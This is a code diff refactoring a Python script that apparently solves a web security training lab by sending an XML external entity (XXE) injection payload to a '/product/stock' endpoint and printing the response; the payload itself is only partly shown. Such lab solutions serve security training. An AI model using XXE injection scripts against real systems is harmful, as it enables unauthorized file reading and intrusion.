@@ -1,13 +1,9 @@
 from ...utils import *
-
-from urllib.parse import urljoin
 from lxml import etree
 
-import requests
 
-
-def solve_lab(url, proxies):
-    url = urljoin(url, "/product/stock")
+def solve_lab(session):
+    path = "/product/stock"
 
     doctype = [
         "<!DOCTYPE foo [",
@@ -33,10 +29,10 @@ def solve_lab(url, proxies):
     data = data.decode()
 
     print_info(
-        f'Injecting an XML external entity with the following POST request data to "{url}":\n'
+        f'Injecting an XML external entity with the following POST request data to "{path}":\n'
     )
     print(f"{data}\n")
 
-    resp = requests.post(url, proxies=proxies, verify=False, data=data)
+    resp = session.post_path(path, data=data)
     print_success("XXE injection successful with the following response:\n")
     print(f"{resp.text}\n")
